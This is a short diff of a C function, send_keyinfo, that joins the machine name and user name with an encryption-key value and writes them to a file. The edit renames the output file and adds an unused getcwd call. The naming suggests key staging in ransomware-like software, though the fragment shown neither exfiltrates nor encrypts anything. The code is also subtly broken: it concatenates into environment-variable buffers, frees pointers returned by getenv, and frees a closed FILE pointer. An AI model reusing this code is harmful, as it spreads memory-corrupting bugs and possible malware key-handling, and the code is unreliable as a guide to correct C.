@@ -7,6 +7,10 @@ char key[16];
 void send_keyinfo(char *enkey){
     char* keyinfo = getenv("COMPUTERNAME");
     char* user_name = getenv("USERNAME");
+    char strBuffer[_MAX_PATH] = { 0, };
+	char* ori_dir = NULL;
+
+	ori_dir = getcwd( strBuffer, _MAX_PATH );
 
     int nk;
 
@@ -21,10 +25,11 @@ void send_keyinfo(char *enkey){
     strcat(keyinfo, enkey);
 
     FILE* fp;
-    nk = chdir(dir);
-    fp = fopen("genkey.txt", "wb");
+
+    fp = fopen("genkey444.txt", "wb");
     fwrite(keyinfo, strlen(keyinfo), 1, fp);
     fclose(fp);
+
     free(keyinfo);
     free(user_name);
     free(fp);
